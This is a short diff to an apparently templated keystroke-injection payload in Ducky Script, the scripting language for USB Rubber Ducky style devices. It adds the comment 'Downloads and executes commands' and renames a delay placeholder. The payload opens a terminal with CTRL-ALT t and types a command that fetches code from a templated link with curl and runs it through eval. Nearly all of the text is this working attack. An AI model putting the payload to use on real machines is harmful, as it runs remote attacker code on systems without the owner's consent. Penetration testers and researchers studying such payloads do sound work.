@@ -1,4 +1,5 @@
-DELAY {delay}
+REM Downloads and executes commands
+DELAY {start_delay}
 CTRL-ALT t
 DELAY 400
 STRING eval $(curl -s {link})
